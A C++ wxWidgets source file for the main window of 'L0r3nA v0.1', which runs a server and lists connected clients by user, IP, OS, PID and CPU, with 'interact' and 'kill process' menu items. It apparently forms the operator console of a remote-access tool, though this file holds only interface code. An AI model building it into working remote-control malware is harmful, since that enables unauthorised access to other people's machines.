#include "frame_client.hpp"
#include "frame_crypt_db.hpp"
#include "frame_main.hpp"
#include "server.hpp"
#include "headers.hpp"
#include "notify.hpp"

extern Servidor* p_Servidor;

const wxString strTitle = "L0r3nA v0.1";

wxBEGIN_EVENT_TABLE(MyFrame, wxFrame)
    EVT_BUTTON(EnumIDS::ID_LimpiarLog, MyFrame::OnLimpiar)
    EVT_TOGGLEBUTTON(EnumIDS::ID_Toggle, MyFrame::OnToggle)
    EVT_BUTTON(EnumIDS::ID_Mostrar_CryptDB, MyFrame::OnCryptDB)
    EVT_CLOSE(MyFrame::OnClose)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyListCtrl, wxListCtrl)
    EVT_CONTEXT_MENU(MyListCtrl::OnContextMenu)
    EVT_MENU(EnumIDS::ID_Interactuar, MyListCtrl::OnInteractuar)
    EVT_MENU(EnumIDS::ID_Refrescar, MyListCtrl::OnRefrescar)
    EVT_MENU(EnumIDS::ID_CerrarProceso, MyListCtrl::OnMatarProceso)
    EVT_LIST_ITEM_ACTIVATED(EnumIDS::ID_Main_List, MyListCtrl::OnActivated)
wxEND_EVENT_TABLE()

class MyApp : public wxApp {
public:
    MyFrame* frame = nullptr;
    bool OnInit() override;
};

wxIMPLEMENT_APP(MyApp);

bool MyApp::OnInit(){
#ifdef __MEM_LEAK_RAVDO
    _CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
#endif
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);

    wxImage::AddHandler(new wxJPEGHandler);
    wxImage::AddHandler(new wxPNGHandler);

    this->frame = DBG_NEW MyFrame();
    this->frame->Show(true);

    return true;
}

MyFrame::MyFrame()
    : wxFrame(nullptr, EnumIDS::ID_MAIN, strTitle)
{
    //Trace memory leak
    //_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
    //_CrtSetBreakAlloc(40997);

    
    SetTransparent(245);
    p_Servidor = DBG_NEW Servidor();
    p_Servidor->m_listCtrl = nullptr;
    
    //Panel derecho ListCtrl
    this->m_RPanel = DBG_NEW wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize); // wxSize(700, 450));

    //Panel izquierdo controles servidor
    this->m_LPanel = DBG_NEW wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);//wxSize(110, 600));

    //Panel inferior log
    this->m_BPanel = DBG_NEW wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    
    //Crear lista
    this->CrearLista(wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
    wxBoxSizer *sizerlist = DBG_NEW wxBoxSizer(wxVERTICAL);
    sizerlist->Add(p_Servidor->m_listCtrl, 1, wxEXPAND | wxALL, 2);
    this->m_RPanel->SetSizer(sizerlist);

    //Crear controles panel izquierdo
    this->CrearControlesPanelIzquierdo();

    //Crear txt para log
    p_Servidor->m_txtLog->p_txtCtrl = DBG_NEW wxTextCtrl(this->m_BPanel, wxID_ANY, ":v\n", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_READONLY);
    wxBoxSizer *sizertxt = DBG_NEW wxBoxSizer(wxVERTICAL);
    sizertxt->Add(DBG_NEW wxButton(this->m_BPanel, EnumIDS::ID_LimpiarLog, "Limpiar Log", wxDefaultPosition, wxDefaultSize), 0, wxALL, 1);
    sizertxt->Add(p_Servidor->m_txtLog->p_txtCtrl, 1, wxEXPAND | wxALL, 1);
    this->m_BPanel->SetSizer(sizertxt);

    wxBoxSizer *sizer = DBG_NEW wxBoxSizer(wxHORIZONTAL);
    sizer->Add(this->m_LPanel, 0, wxEXPAND | wxALL, 2);

    wxBoxSizer *sizer2 = DBG_NEW wxBoxSizer(wxVERTICAL);
    sizer2->Add(this->m_RPanel, 1, wxEXPAND | wxALL, 2);
    sizer2->Add(this->m_BPanel, 0, wxEXPAND | wxALL, 2);

    sizer->Add(sizer2, 1, wxEXPAND | wxALL, 1);

    this->SetSizerAndFit(sizer);

    SetClientSize(800,300);
    
    CreateStatusBar();
    SetStatusText("IDLE");
    
#ifdef DEBUG_DESIGN_LIMITS
    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo con transparencia
    this->m_BPanel->SetBackgroundColour(wxColor(0, 255, 0));
    this->m_RPanel->SetBackgroundColour(wxColor(0, 0, 255));
    this->m_LPanel->SetBackgroundColour(wxColor(255, 0, 0));
#endif

   /* SOCKET nsocket = INVALID_SOCKET;
    std::string strip = "127.0.0.1";
    std::string title_ = "Random";
    FrameCliente* nframe = new FrameCliente(title_, nsocket, strip);
    nframe->Show(true);*/
}

void MyFrame::OnCryptDB(wxCommandEvent& event) {
    frameCryptDB* frame_crypt = DBG_NEW frameCryptDB();

    frame_crypt->Show();
}

void MyFrame::OnToggle(wxCommandEvent& event) {
    bool isSel = this->btn_toggle->GetValue();
    if (isSel) {
        //Iniciar escucha
        
        if (p_Servidor->m_Iniciar()) {
            p_Servidor->m_Handler();
            this->btn_toggle->SetLabelText("Detener Servidor");
            SetStatusText("Esperando clientes...");
        }else {
            std::string strTmp = "Error escuchando ";
            strTmp.append(std::to_string(GetLastError()));
            p_Servidor->m_txtLog->LogThis(strTmp, LogType::LogError);
            SetStatusText("Error");
        }
        
    }else {
        //Detener escuchar
        p_Servidor->m_StopHandler();
        p_Servidor->m_JoinThreads();

        DEBUG_MSG("VECTOR SIZE:"); 
        DEBUG_MSG(p_Servidor->vc_Clientes.size());

        p_Servidor->m_listCtrl->DeleteAllItems();
        SetStatusText("IDLE");
        SetTitle(strTitle);
        this->btn_toggle->SetLabelText("Iniciar Servidor");
    }
    Sleep(500);
}

void MyFrame::CrearControlesPanelIzquierdo(){
    wxSize btn_size;
    this->btn_toggle = DBG_NEW wxToggleButton(this->m_LPanel, EnumIDS::ID_Toggle, "Iniciar Servidor");

    btn_size = this->btn_toggle->GetSize();
     
    this->btn_CryptDB = DBG_NEW wxButton(this->m_LPanel, EnumIDS::ID_Mostrar_CryptDB, "Crypt DB", wxDefaultPosition, btn_size);
    
    wxBoxSizer *m_paneSizer = DBG_NEW wxBoxSizer(wxVERTICAL);
    m_paneSizer->AddSpacer(20);    
    m_paneSizer->Add(this->btn_toggle, 0, wxALIGN_CENTER | wxALL, 3);
    m_paneSizer->AddSpacer(10);
    m_paneSizer->Add(this->btn_CryptDB, 0, wxALIGN_CENTER | wxALL, 3);
    
    this->m_LPanel->SetSizerAndFit(m_paneSizer);
}

void MyFrame::CrearLista(long flags, bool withText){
    p_Servidor->m_listCtrl = DBG_NEW MyListCtrl(this->m_RPanel, EnumIDS::ID_Main_List, wxDefaultPosition, wxDefaultSize, flags | wxBORDER_THEME);
   
    wxListItem itemCol;
    itemCol.SetText("ID");
    itemCol.SetWidth(100);
    itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
    p_Servidor->m_listCtrl->InsertColumn(0, itemCol);

    itemCol.SetText("USUARIO");
    itemCol.SetWidth(160);
    p_Servidor->m_listCtrl->InsertColumn(1, itemCol);

    itemCol.SetText("IP");
    itemCol.SetWidth(120);
    p_Servidor->m_listCtrl->InsertColumn(2, itemCol);

    itemCol.SetText("SO");
    itemCol.SetWidth(140);
    p_Servidor->m_listCtrl->InsertColumn(3, itemCol);

    itemCol.SetText("PID");
    itemCol.SetWidth(60);
    p_Servidor->m_listCtrl->InsertColumn(4, itemCol);

    itemCol.SetText("CPU");
    itemCol.SetWidth(200);
    p_Servidor->m_listCtrl->InsertColumn(5, itemCol);
}

void MyFrame::OnClose(wxCloseEvent& event){
    wxMessageDialog dialog(this, "Seguro que quieres salir?", "Salir", wxCENTER | wxYES_NO | wxICON_QUESTION);
    
    switch (dialog.ShowModal()) {
    case wxID_NO:
        event.Veto();
        return;
    case wxID_YES:
        break;
    }  
    

    p_Servidor->m_StopHandler();
    p_Servidor->m_JoinThreads();
    p_Servidor->m_CerrarConexiones();
    p_Servidor->m_listCtrl->DeleteAllItems();
    
    delete p_Servidor;
    p_Servidor = nullptr;
    
    event.Skip();
}

void MyFrame::OnExit(wxCommandEvent& event) {
    Close(true);
#ifdef __MEM_LEAK_RAVDO
    _CrtDumpMemoryLeaks();
#endif
}

void MyFrame::OnLimpiar(wxCommandEvent& event) {
    p_Servidor->m_txtLog->p_txtCtrl->Clear();
}

void MyFrame::OnAbout(wxCommandEvent& event){
    wxMessageBox(wxT("L0r3na v0.1"), wxT("About"));
}

